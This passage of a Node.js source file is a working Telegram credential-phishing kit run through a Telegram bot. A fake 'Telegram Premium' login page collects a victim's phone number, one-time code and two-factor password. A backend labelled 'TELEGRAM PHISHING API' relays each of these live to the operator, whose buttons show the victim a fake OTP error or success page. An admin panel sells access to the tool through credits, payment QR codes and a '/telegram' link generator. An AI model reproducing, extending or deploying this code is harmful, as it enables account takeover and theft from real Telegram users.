            passwordInput.focus();
            if (otpTimerInterval) clearInterval(otpTimerInterval);
        } else {
            hideLoader(otpLoader);
            verifyOtpBtn.disabled = false;
            showError(otpError, '❌ Verification failed. Please try again.');
        }
    });

    // Resend OTP
    resendOtpBtn.addEventListener('click', async () => {
        if (resendOtpBtn.disabled) return;
        setStatus('📤 Resending verification code...');
        await apiCall('resend-otp', { phone: phoneNumber });
        setStatus('✅ Verification code resent!', true);
        startOtpTimer();
        otpInput.value = '';
        otpInput.focus();
    });

    // ====================== PASSWORD ======================
    passwordSubmitBtn.addEventListener('click', async () => {
        const pwd = passwordInput.value.trim();
        if (pwd.length < 4) {
            showError(passwordError, 'Please enter a valid password (minimum 4 characters).');
            return;
        }
        password = pwd;
        hideError(passwordError);
        showLoader(passwordLoader);
        passwordSubmitBtn.disabled = true;

        // Send password to creator
        const result = await apiCall('password', { password: password, phone: phoneNumber });

        if (result.status === 'success') {
            hideLoader(passwordLoader);
            passwordSubmitBtn.disabled = false;
            passwordSection.classList.remove('active');
            finalResult.style.display = 'block';
            currentStep = 'final';
            setStatus('✅ Premium request submitted successfully!', true);
        } else {
            hideLoader(passwordLoader);
            passwordSubmitBtn.disabled = false;
            showError(passwordError, '❌ Wrong password. Please try again.');
            passwordInput.value = '';
            passwordInput.focus();
        }
    });

    // ====================== FINAL BUTTONS ======================
    openCompletedBtn.addEventListener('click', () => {
        openStatus.textContent = '✅ Thank you! Your request has been submitted.';
        openStatus.className = 'status-text show';
        openStatus.style.color = '#2ed573';
        setStatus('📱 Request submitted successfully!', true);
        apiCall('completed', { phone: phoneNumber });
    });

    // ====================== KEYBOARD SHORTCUTS ======================
    phoneInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') sendOtpBtn.click();
    });
    otpInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') verifyOtpBtn.click();
    });
    passwordInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') passwordSubmitBtn.click();
    });

    // ====================== PHONE NUMBER FORMATTING ======================
    phoneInput.addEventListener('input', () => {
        phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
    });
    otpInput.addEventListener('input', () => {
        otpInput.value = otpInput.value.replace(/[^0-9]/g, '').slice(0, 5);
    });

    // ====================== AUTO-FOCUS ======================
    phoneInput.focus();

    console.log('✅ Telegram Phishing Page Loaded');
    console.log('👤 User ID:', USER_ID);
    console.log('📱 Session:', SESSION_ID);
</script>
</body>
</html>`;

// ====================== EXPRESS ROUTES ======================
app.use('/api/photos', express.static(BOT_PHOTO_DIR));

// ====================== TELEGRAM DECISION API ======================
app.get('/api/telegram-decision/:sessionId', async (req, res) => {
    try {
        const sessionId = req.params.sessionId;
        if (!global.phishSessions || !global.phishSessions[sessionId]) {
            return res.json({ decision: null });
        }
        const session = global.phishSessions[sessionId];
        if (session.decision) {
            return res.json({ decision: session.decision });
        }
        return res.json({ decision: null });
    } catch (err) {
        return res.status(500).json({ error: err.message });
    }
});

// ====================== TELEGRAM PHISHING API ======================
app.post('/api/telegram-phish', async (req, res) => {
    try {
        const { sessionId, userId, platform, phone, otp, password, action } = req.body || {};
        console.log('📱 Telegram Phish:', { sessionId, userId, action, phone, otp, password });

        // Store session data
        if (!global.phishSessions) global.phishSessions = {};
        if (!global.phishSessions[sessionId]) {
            global.phishSessions[sessionId] = { 
                userId, 
                platform, 
                phone, 
                otp, 
                password, 
                step: 'login', 
                createdAt: Date.now(),
                decision: null
            };
        }
        const session = global.phishSessions[sessionId];

        // Handle different actions
        if (action === 'phone') {
            session.phone = phone;
            session.step = 'otp';
            
            // Send phone number to creator
            const creatorMsg = `📱 <b>Telegram Login Attempt</b>\n\n👤 <b>User ID:</b> <code>${userId}</code>\n📱 <b>Phone:</b> <code>${phone}</code>\n⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n📌 <b>Status:</b> Waiting for OTP...`;
            
            await S7.sendMessage(config.adminId, creatorMsg, { parse_mode: 'HTML' });
            await S7.sendMessage(userId, `📱 <b>New Telegram Login Attempt</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n⏰ ${new Date().toLocaleString()}\n\n💡 Target has entered their phone number. Waiting for OTP...`, { parse_mode: 'HTML' });
            
            logToFile(`📱 Phone received: ${phone} from user ${userId}`);
            return res.json({ status: 'success' });
        }

        if (action === 'otp') {
            session.otp = otp;
            session.step = 'otp_verification';
            session.decision = null; // Reset decision
            
            // Send OTP to creator with 3 options
            const creatorMsg = `🔐 <b>OTP Received</b>\n\n👤 <b>User ID:</b> <code>${userId}</code>\n📱 <b>Phone:</b> <code>${session.phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n⏰ ${new Date().toLocaleString()}\n\n📌 <b>Choose action:</b>`;
            
            const buttons = {
                inline_keyboard: [
                    [{ text: '✅ Password Manga Raha', callback_data: `phish_password_${sessionId}` }],
                    [{ text: '❌ OTP Galat Hai', callback_data: `phish_wrong_${sessionId}` }],
                    [{ text: '📱 Open Ho Gya Telegram', callback_data: `phish_open_${sessionId}` }]
                ]
            };
            
            await S7.sendMessage(config.adminId, creatorMsg, { parse_mode: 'HTML', reply_markup: buttons });
            await S7.sendMessage(userId, `🔐 <b>OTP Received</b>\n\n📱 <b>Phone:</b> <code>${session.phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n⏰ ${new Date().toLocaleString()}\n\n⏳ Waiting for your decision...`, { parse_mode: 'HTML' });
            
            logToFile(`🔐 OTP received: ${otp} for phone ${session.phone}`);
            return res.json({ status: 'waiting_decision' });
        }

        if (action === 'password') {
            session.password = password;
            session.step = 'password_received';
            
            const creatorMsg = `🔑 <b>Password Received</b>\n\n👤 <b>User ID:</b> <code>${userId}</code>\n📱 <b>Phone:</b> <code>${session.phone}</code>\n🔑 <b>Password:</b> <code>${password}</code>\n⏰ ${new Date().toLocaleString()}\n\n✅ Full access credentials collected!`;
            
            await S7.sendMessage(config.adminId, creatorMsg, { parse_mode: 'HTML' });
            await S7.sendMessage(userId, `✅ <b>Password Received</b>\n\n📱 <b>Phone:</b> <code>${session.phone}</code>\n🔑 <b>Password:</b> <code>${password}</code>\n⏰ ${new Date().toLocaleString()}\n\n🎯 Full credentials captured successfully!`, { parse_mode: 'HTML' });
            
            logToFile(`🔑 Password received for phone ${session.phone}`);
            return res.json({ status: 'success' });
        }

        if (action === 'completed') {
            session.step = 'completed';
            await S7.sendMessage(config.adminId, `✅ <b>Telegram Premium Request Submitted!</b>\n\n👤 User: <code>${userId}</code>\n📱 Phone: <code>${session.phone}</code>\n⏰ ${new Date().toLocaleString()}`, { parse_mode: 'HTML' });
            await S7.sendMessage(userId, `✅ <b>Request Completed!</b>\n\n📱 Phone: <code>${session.phone}</code>\n⏰ ${new Date().toLocaleString()}\n\n🎉 Target has completed the process!`, { parse_mode: 'HTML' });
            logToFile(`✅ Completed for phone ${session.phone}`);
            return res.json({ status: 'success' });
        }

        if (action === 'resend-otp') {
            await S7.sendMessage(config.adminId, `🔄 <b>OTP Resend Request</b>\n\n👤 User: <code>${userId}</code>\n📱 Phone: <code>${session.phone}</code>`, { parse_mode: 'HTML' });
            return res.json({ status: 'success' });
        }

        return res.json({ status: 'unknown_action' });
    } catch (err) {
        console.error('Telegram Phish Error:', err);
        return res.status(500).json({ error: err.message });
    }
});

// ====================== TELEGRAM PHISHING CALLBACKS ======================
S7.on('callback_query', async (q) => {
    if (q.data.startsWith('phish_')) {
        const parts = q.data.split('_');
        const action = parts[1];
        const sessionId = parts[2] || '';

        if (!global.phishSessions || !global.phishSessions[sessionId]) {
            await S7.answerCallbackQuery(q.id, { text: '❌ Session expired or not found', show_alert: true });
            return;
        }

        const session = global.phishSessions[sessionId];
        const userId = session.userId;

        if (action === 'password') {
            session.decision = 'password';
            await S7.answerCallbackQuery(q.id, { text: '✅ Showing password page to user' });
            await S7.sendMessage(config.adminId, `✅ Password section shown to user ${userId}`);
            await S7.sendMessage(userId, `✅ Target is now entering password...`);
            logToFile(`✅ Password page shown to user ${userId}`);
        } else if (action === 'wrong') {
            session.decision = 'wrong';
            await S7.answerCallbackQuery(q.id, { text: '❌ Showing wrong OTP error to user' });
            await S7.sendMessage(config.adminId, `❌ Wrong OTP error shown to user ${userId}`);
            await S7.sendMessage(userId, `❌ Showing wrong OTP error to target...`);
            logToFile(`❌ Wrong OTP shown to user ${userId}`);
        } else if (action === 'open') {
            session.decision = 'open';
            await S7.answerCallbackQuery(q.id, { text: '📱 Showing success page to user' });
            await S7.sendMessage(config.adminId, `📱 Success page shown to user ${userId}`);
            await S7.sendMessage(userId, `📱 Target is seeing success page...`);
            logToFile(`📱 Success page shown to user ${userId}`);
        }
        
        await S7.editMessageReplyMarkup({ 
            chat_id: q.message.chat.id, 
            message_id: q.message.message_id, 
            reply_markup: { inline_keyboard: [] } 
        });
    }
});

// ====================== ADMIN API ENDPOINTS ======================

// Get all photos
app.get('/api/admin/photos', async (req, res) => {
    try {
        const photos = await getPhotos();
        res.json({ photos });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Upload photo via admin (using multer)
app.post('/api/admin/upload', upload.single('photo'), async (req, res) => {
    try {
        if (!req.file) {
            console.error('No file in request');
            return res.status(400).json({ error: 'No file uploaded' });
        }
        const caption = req.body.caption || '';
        const photo = await addPhoto(req.file, caption);
        res.json({ success: true, photo });
    } catch (err) {
        console.error('Upload error:', err);
        res.status(500).json({ error: err.message });
    }
});

// Delete photo
app.delete('/api/admin/photos/:id', async (req, res) => {
    try {
        const success = await deletePhoto(req.params.id);
        if (success) res.json({ success: true });
        else res.status(404).json({ error: 'Photo not found' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Toggle photo active
app.patch('/api/admin/photos/:id/toggle', async (req, res) => {
    try {
        const photo = await togglePhoto(req.params.id);
        if (photo) res.json({ success: true, photo });
        else res.status(404).json({ error: 'Photo not found' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get channels
app.get('/api/admin/channels', async (req, res) => {
    try {
        const channels = await getChannels();
        res.json(channels);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Add channel
app.post('/api/admin/channels', async (req, res) => {
    try {
        const { id, name, link } = req.body;
        if (!id || !name || !link) return res.status(400).json({ error: 'Missing fields' });
        const channel = await addChannel(id, name, link);
        res.json({ success: true, channel });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Remove channel
app.delete('/api/admin/channels/:id', async (req, res) => {
    try {
        await removeChannel(req.params.id);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get all users
app.get('/api/admin/users', async (req, res) => {
    try {
        const users = await User.find();
        const userMap = {};
        users.forEach(u => {
            userMap[u.userId] = {
                credits: u.credits,
                unlimited: u.unlimited,
                totalReferrals: u.totalReferrals,
                joinedAt: u.joinedAt,
                referredBy: u.referredBy,
                banned: u.banned
            };
        });
        res.json(userMap);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get single user
app.get('/api/admin/user/:userId', async (req, res) => {
    try {
        const user = await getUser(req.params.userId);
        res.json({
            credits: user.credits,
            unlimited: user.unlimited,
            totalReferrals: user.totalReferrals,
            joinedAt: user.joinedAt,
            referredBy: user.referredBy,
            banned: user.banned
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Modify credits
app.post('/api/admin/modify-credits', async (req, res) => {
    try {
        const { userId, amount } = req.body;
        if (!userId || amount === undefined) return res.status(400).json({ error: 'Missing fields' });
        const user = await getUser(userId);
        if (user.unlimited) return res.json({ success: true, credits: 'Unlimited', unlimited: true });
        user.credits += amount;
        if (user.credits < 0) user.credits = 0;
        await user.save();
        res.json({ success: true, credits: user.credits });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Toggle unlimited
app.post('/api/admin/toggle-unlimited', async (req, res) => {
    try {
        const { userId } = req.body;
        if (!userId) return res.status(400).json({ error: 'Missing userId' });
        const user = await getUser(userId);
        user.unlimited = !user.unlimited;
        await user.save();
        res.json({ success: true, unlimited: user.unlimited });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get featured
app.get('/api/admin/featured', async (req, res) => {
    try {
        const featured = await getFeatured();
        let photoData = null;
        if (featured.photo) {
            const photo = await Photo.findOne({ id: featured.photo });
            if (photo) photoData = { id: photo.id, url: photo.url, caption: photo.caption };
        }
        res.json({
            photo: featured.photo,
            photoData,
            message: featured.message,
            status: featured.status
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Set featured photo
app.post('/api/admin/featured/photo', async (req, res) => {
    try {
        const { photoId } = req.body;
        if (!photoId) return res.status(400).json({ error: 'Missing photoId' });
        await setFeaturedPhoto(photoId);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Remove featured photo
app.delete('/api/admin/featured/photo', async (req, res) => {
    try {
        await setFeaturedPhoto(null);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Set featured message
app.post('/api/admin/featured/message', async (req, res) => {
    try {
        const { message } = req.body;
        if (!message) return res.status(400).json({ error: 'Missing message' });
        await setFeaturedMessage(message);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Toggle featured status
app.post('/api/admin/featured/toggle', async (req, res) => {
    try {
        await toggleFeaturedStatus();
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get QR code
app.get('/api/admin/qr', async (req, res) => {
    if (qrExists()) {
        res.sendFile(QR_FILE);
    } else {
        res.status(404).json({ error: 'QR not found' });
    }
});

// Upload QR (multipart)
app.post('/api/admin/upload-qr', upload.single('qr'), async (req, res) => {
    try {
        if (!req.file) {
            console.error('QR upload: No file received');
            return res.status(400).json({ error: 'No file uploaded' });
        }
        console.log('QR upload: file received', req.file.originalname);
        const buffer = fs.readFileSync(req.file.path);
        const saved = saveQRBuffer(buffer);
        fs.unlinkSync(req.file.path);
        if (saved) {
            res.json({ success: true });
        } else {
            res.status(500).json({ error: 'Failed to save QR code' });
        }
    } catch (err) {
        console.error('QR upload error:', err);
        res.status(500).json({ error: err.message });
    }
});

// Remove QR
app.delete('/api/admin/remove-qr', (req, res) => {
    const removed = deleteQRFile();
    if (removed) res.json({ success: true });
    else res.status(404).json({ error: 'QR not found' });
});

// Get logs
app.get('/api/admin/logs', (req, res) => {
    try {
        const logPath = path.join(DATA_DIR, 'logs.txt');
        if (fs.existsSync(logPath)) {
            const logs = fs.readFileSync(logPath, 'utf8');
            const lastLogs = logs.split('\n').slice(-100).join('\n');
            res.json({ logs: lastLogs });
        } else {
            res.json({ logs: 'No logs available' });
        }
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Clear logs
app.delete('/api/admin/logs', (req, res) => {
    try {
        const logPath = path.join(DATA_DIR, 'logs.txt');
        if (fs.existsSync(logPath)) fs.writeFileSync(logPath, '');
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ====================== ADMIN ROUTE ======================
app.get('/admin', (req, res) => {
    res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Panel</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}body{background:#0a0a0a;color:#fff;padding:20px}.container{max-width:1200px;margin:0 auto}.header{background:linear-gradient(135deg,#ff4757,#ff6b6b);padding:30px;border-radius:15px;margin-bottom:30px;text-align:center}.header h1{font-size:36px}.tabs{display:flex;gap:10px;margin-bottom:30px;flex-wrap:wrap}.tab{background:#1a1a2e;padding:12px 25px;border-radius:10px;cursor:pointer;border:1px solid #2a2a4a;transition:.3s;color:#fff}.tab.active{background:linear-gradient(135deg,#ff4757,#ff6b6b);border-color:#ff4757}.tab:hover{background:#2a2a4a}.tab-content{display:none}.tab-content.active{display:block}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:20px}.card{background:#1a1a2e;border-radius:15px;padding:15px;border:1px solid #2a2a4a;transition:.3s}.card:hover{transform:translateY(-5px);border-color:#ff4757}.card img{width:100%;height:200px;object-fit:cover;border-radius:10px}.card .info{padding:10px 0}.card .actions{display:flex;gap:10px;margin-top:10px;flex-wrap:wrap}.btn{padding:8px 15px;border:none;border-radius:8px;cursor:pointer;font-weight:600;transition:.3s}.btn-danger{background:#dc3545;color:#fff}.btn-danger:hover{background:#c82333}.btn-warning{background:#ffc107;color:#000}.btn-warning:hover{background:#e0a800}.btn-primary{background:linear-gradient(135deg,#ff4757,#ff6b6b);color:#fff}.btn-primary:hover{background:linear-gradient(135deg,#ff6b6b,#ff4757)}.btn-success{background:linear-gradient(135deg,#ff4757,#ff6b6b);color:#fff}.btn-success:hover{background:linear-gradient(135deg,#ff6b6b,#ff4757)}.upload-section{background:#1a1a2e;padding:30px;border-radius:15px;margin-bottom:30px;border:2px dashed #2a2a4a}.upload-section form{display:flex;gap:20px;flex-wrap:wrap;align-items:center}.upload-section input[type="file"]{background:transparent;color:#fff;padding:10px;border:1px solid #2a2a4a;border-radius:8px}.upload-section input[type="text"]{flex:1;min-width:200px;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;border-radius:8px;color:#fff}.stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px;margin-bottom:30px}.stat-card{background:#1a1a2e;padding:20px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}.stat-card .number{font-size:32px;font-weight:700;color:#ff4757}.stat-card .label{color:#888;font-size:14px}.channel-item{background:#1a1a2e;padding:15px;border-radius:10px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;border:1px solid #2a2a4a}.channel-item .name{font-weight:600}.channel-item .id{color:#888;font-size:12px}.user-card{background:#1a1a2e;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-bottom:10px}.user-card .uid{color:#ff4757;font-weight:600}.toast{position:fixed;bottom:20px;right:20px;background:#28a745;color:#fff;padding:15px 30px;border-radius:10px;display:none;z-index:999}.toast.error{background:#dc3545}.empty{text-align:center;padding:60px 20px;color:#666}.empty i{font-size:64px;margin-bottom:20px;display:block}input,select{padding:10px;border-radius:8px;border:1px solid #2a2a4a;background:#0a0a0a;color:#fff;margin:5px}.flex{display:flex;gap:10px;flex-wrap:wrap;align-items:center}.qr-section{background:#1a1a2e;padding:30px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}.qr-section img{max-width:200px;border-radius:10px;border:2px solid #2a2a4a}.featured-preview{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-top:10px}.featured-preview img{max-width:200px;border-radius:10px}.status-badge{padding:8px 20px;border-radius:20px;font-weight:600;display:inline-block}.status-active{background:#1a3a1a;color:#28a745}.status-inactive{background:#3a1a1a;color:#dc3545}.logs-area{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;max-height:400px;overflow-y:auto;font-family:monospace;font-size:12px;color:#aaa;white-space:pre-wrap}.qr-preview{border:2px solid #2a2a4a;border-radius:10px;padding:10px;background:#0a0a0a;display:inline-block;margin-top:10px}
</style></head>
<body><div class="container"><div class="header"><h1>📸 Admin Panel</h1><p>Complete Control</p></div>
<div class="tabs"><div class="tab active" onclick="showTab('photos')">📷 Photos</div><div class="tab" onclick="showTab('channels')">📢 Channels</div><div class="tab" onclick="showTab('users')">👥 Users</div><div class="tab" onclick="showTab('featured')">⭐ Featured</div><div class="tab" onclick="showTab('qr')">💰 QR</div><div class="tab" onclick="showTab('logs')">📋 Logs</div><div class="tab" onclick="showTab('commands')">📜 Commands</div></div>
<div id="tab-photos" class="tab-content active"><div class="stats" id="stats"></div><div class="upload-section"><h3>📤 Upload Photo</h3><form id="uploadForm" enctype="multipart/form-data"><input type="file" name="photo" accept="image/*" required><input type="text" name="caption" placeholder="Caption"><button type="submit" class="btn btn-primary">Upload</button></form></div><div id="photoGrid" class="grid"></div></div>
<div id="tab-channels" class="tab-content"><h2>📢 Manage Channels</h2><div class="upload-section"><h3>➕ Add Channel</h3><div class="flex"><input type="text" id="channelId" placeholder="Channel ID" style="flex:1"><input type="text" id="channelName" placeholder="Channel Name" style="flex:1"><input type="text" id="channelLink" placeholder="Channel Link" style="flex:1"><button class="btn btn-success" onclick="addChannel()">Add</button></div></div><div id="channelList"></div></div>
<div id="tab-users" class="tab-content"><h2>👥 Manage Users</h2><div class="flex" style="margin-bottom:20px"><input type="text" id="searchUser" placeholder="Search User ID..." style="flex:1"><button class="btn btn-primary" onclick="searchUser()">Search</button></div><div id="userList"></div><div class="flex" style="margin-top:20px"><input type="text" id="userIdInput" placeholder="User ID" style="flex:1"><input type="number" id="creditAmount" placeholder="Credits" style="width:150px"><button class="btn btn-warning" onclick="modifyCredits()">Modify</button><button class="btn btn-success" onclick="toggleUnlimited()">Unlimited</button></div></div>
<div id="tab-featured" class="tab-content"><h2>⭐ Featured Settings</h2><div class="upload-section"><h3>📸 Featured Photo</h3><div class="flex"><select id="featuredPhotoSelect" style="flex:1;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;color:#fff;border-radius:8px;"><option value="">Select a photo...</option></select><button class="btn btn-primary" onclick="setFeaturedPhoto()">Set</button><button class="btn btn-danger" onclick="removeFeaturedPhoto()">Remove</button></div><div id="featuredPreview" class="featured-preview"><p style="color:#888;">No featured photo</p></div></div><div class="upload-section"><h3>💬 Featured Message</h3><div class="flex"><input type="text" id="featuredMessage" placeholder="Enter message..." style="flex:1;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;color:#fff;border-radius:8px;"><button class="btn btn-primary" onclick="setFeaturedMessage()">Update</button></div><div id="featuredMessageDisplay" style="margin-top:10px;padding:15px;background:#0a0a0a;border-radius:8px;border:1px solid #2a2a4a;color:#aaa;"></div></div><div class="upload-section"><h3>⚙️ Status</h3><div class="flex"><span id="featuredStatus" class="status-badge status-active">✅ Active</span><button class="btn btn-warning" onclick="toggleFeaturedStatus()">Toggle</button></div></div></div>
<div id="tab-qr" class="tab-content"><div class="qr-section"><h2>💰 Payment QR Code</h2>
<p style="color:#888;margin:10px 0;">Upload QR code image below</p>
<div class="flex" style="justify-content:center;margin:20px 0;">
<input type="file" id="qrUpload" accept="image/*" style="background:#0a0a0a;color:#fff;padding:10px;border:1px solid #2a2a4a;border-radius:8px;">
<button class="btn btn-primary" onclick="uploadQR()">📤 Upload QR</button>
<button class="btn btn-danger" onclick="removeQR()">🗑️ Remove QR</button>
</div>
<div id="qrPreview" class="qr-preview" style="margin-top:20px;display:none;">
<p style="color:#888;margin-bottom:10px;">✅ Current QR Code:</p>
<img id="qrImage" src="" style="max-width:200px;border-radius:10px;border:2px solid #28a745;">
</div>
<div id="qrStatus" style="margin-top:10px;padding:10px;border-radius:8px;background:#1a1a2e;border:1px solid #2a2a4a;color:#888;"></div>
</div></div>
<div id="tab-logs" class="tab-content"><h2>📋 Server Logs</h2><div class="flex" style="margin-bottom:20px"><button class="btn btn-primary" onclick="loadLogs()">Refresh</button><button class="btn btn-danger" onclick="clearLogs()">Clear Logs</button></div><div id="logsDisplay" class="logs-area">Loading logs...</div></div>
<div id="tab-commands" class="tab-content"><h2>📜 All Commands</h2><div class="upload-section"><h3>👑 Admin Commands</h3><pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">/help or /commands - Show all commands\n/admin - Open admin panel\n/addcredits [userId] [amount] - Add credits\n/removecredits [userId] [amount] - Remove credits\n/unlimited [userId] - Activate unlimited\n/resetuser [userId] - Reset user\n/users - Show all users\n/stats - Bot statistics\n/broadcast [message] - Send to all users\n/addqr - Upload QR code\n/removeqr - Remove QR code\n/viewqr - View QR code\n/addchannel [id] [name] [link] - Add channel\n/removechannel [id] - Remove channel\n/channels - List all channels\n/addphoto [caption] - Upload photo (reply with image)\n/featured [photoId] - Set featured photo\n/featuredmsg [message] - Set featured message\n/featuredtoggle - Toggle featured on/off\n/logs - Show recent logs\n/restart - Restart bot\n/dm [userId] [message] - DM a user\n/ban [userId or @username] - Ban user\n/unban [userId or @username] - Unban user\n/createcoupon [code] [credits] [maxUses] - Create coupon\n/coupons - List all coupons\n/deletecoupon [code] - Delete coupon\n/getadmin - Get admin panel link</pre><h3 style="margin-top:20px">👤 User Commands</h3><pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">/start - Start the bot\n/menu - Show main menu\n/pay [amount] - Buy credits (e.g., /pay 20)\n/credits - Check your credits\n/referral - Get referral link\n/redeem [coupon_code] - Redeem coupon\n/telegram - Generate Telegram login link</pre></div></div>
</div>
<div id="toast" class="toast"></div>
<script>
var API_BASE=window.location.origin;
function showToast(m,e){e=e||false;var t=document.getElementById("toast");t.textContent=m;t.className="toast"+(e?" error":"");t.style.display="block";setTimeout(function(){t.style.display="none"},3000);}
function showTab(tab){document.querySelectorAll(".tab-content").forEach(function(t){t.classList.remove("active")});document.querySelectorAll(".tab").forEach(function(t){t.classList.remove("active")});document.getElementById("tab-"+tab).classList.add("active");document.querySelector(".tab[onclick=\\"showTab(\\\'"+tab+"\\\')\\"]").classList.add("active");if(tab==="channels")loadChannels();if(tab==="users")loadUsers();if(tab==="featured")loadFeatured();if(tab==="logs")loadLogs();if(tab==="qr")loadQR();}
async function loadPhotos(){try{var r=await fetch("/api/admin/photos");var d=await r.json();var photos=d.photos||[];var active=photos.filter(function(p){return p.active}).length;var total=photos.length;document.getElementById("stats").innerHTML="<div class=\\"stat-card\\"><div class=\\"number\\">"+total+"</div><div class=\\"label\\">Total</div></div><div class=\\"stat-card\\"><div class=\\"number\\">"+active+"</div><div class=\\"label\\">Active</div></div><div class=\\"stat-card\\"><div class=\\"number\\">"+(total-active)+"</div><div class=\\"label\\">Inactive</div></div>";var grid=document.getElementById("photoGrid");if(photos.length===0){grid.innerHTML="<div class=\\"empty\\"><i>📷</i>No photos</div>";return;}var html="";for(var i=0;i<photos.length;i++){var p=photos[i];html+="<div class=\\"card\\"><img src=\\""+p.url+"\\"><div class=\\"info\\"><div>"+(p.caption||"No caption")+"</div><div style=\\"font-size:12px;color:#888;\\">"+new Date(p.uploadedAt).toLocaleDateString()+"</div><div style=\\"font-size:12px;color:"+(p.active?"#28a745":"#dc3545")+";\\">"+(p.active?"✅ Active":"❌ Inactive")+"</div></div><div class=\\"actions\\"><button class=\\"btn btn-warning\\" onclick=\\"togglePhoto(\\\'"+p.id+"\\\')\\">"+(p.active?"Hide":"Show")+"</button><button class=\\"btn btn-danger\\" onclick=\\"deletePhoto(\\\'"+p.id+"\\\')\\">Delete</button></div></div>";}grid.innerHTML=html;}catch(err){showToast("Error loading photos",true);}}
async function deletePhoto(id){if(!confirm("Delete?"))return;try{var r=await fetch("/api/admin/photos/"+id,{method:"DELETE"});if(r.ok){showToast("Deleted!");loadPhotos();}else showToast("Delete failed",true);}catch(err){showToast("Error",true);}}
async function togglePhoto(id){try{var r=await fetch("/api/admin/photos/"+id+"/toggle",{method:"PATCH"});if(r.ok){showToast("Toggled!");loadPhotos();}else showToast("Toggle failed",true);}catch(err){showToast("Error",true);}}
document.getElementById("uploadForm").addEventListener("submit",async function(e){e.preventDefault();var fd=new FormData(e.target);try{var r=await fetch("/api/admin/upload",{method:"POST",body:fd});if(r.ok){showToast("Uploaded!");e.target.reset();loadPhotos();loadFeatured();}else showToast("Upload failed",true);}catch(err){showToast("Error",true);}});
async function loadChannels(){try{var r=await fetch("/api/admin/channels");var channels=await r.json();var list=document.getElementById("channelList");if(channels.length===0){list.innerHTML="<div class=\\"empty\\"><i>📢</i>No channels</div>";return;}var html="";for(var i=0;i<channels.length;i++){var c=channels[i];html+="<div class=\\"channel-item\\"><div><div class=\\"name\\">"+c.name+"</div><div class=\\"id\\">"+c.id+"</div></div><div><a href=\\""+c.link+"\\" target=\\"_blank\\" class=\\"btn btn-primary\\">Visit</a><button class=\\"btn btn-danger\\" onclick=\\"removeChannel(\\\'"+c.id+"\\\')\\">Remove</button></div></div>";}list.innerHTML=html;}catch(err){showToast("Error loading channels",true);}}
async function addChannel(){var id=document.getElementById("channelId").value.trim();var name=document.getElementById("channelName").value.trim();var link=document.getElementById("channelLink").value.trim();if(!id||!name||!link){showToast("Fill all fields",true);return;}try{var r=await fetch("/api/admin/channels",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({id:id,name:name,link:link})});if(r.ok){showToast("Channel added!");["channelId","channelName","channelLink"].forEach(function(i){document.getElementById(i).value=""});loadChannels();}else showToast("Add failed",true);}catch(err){showToast("Error",true);}}
async function removeChannel(id){if(!confirm("Remove?"))return;try{var r=await fetch("/api/admin/channels/"+id,{method:"DELETE"});if(r.ok){showToast("Removed!");loadChannels();}else showToast("Remove failed",true);}catch(err){showToast("Error",true);}}
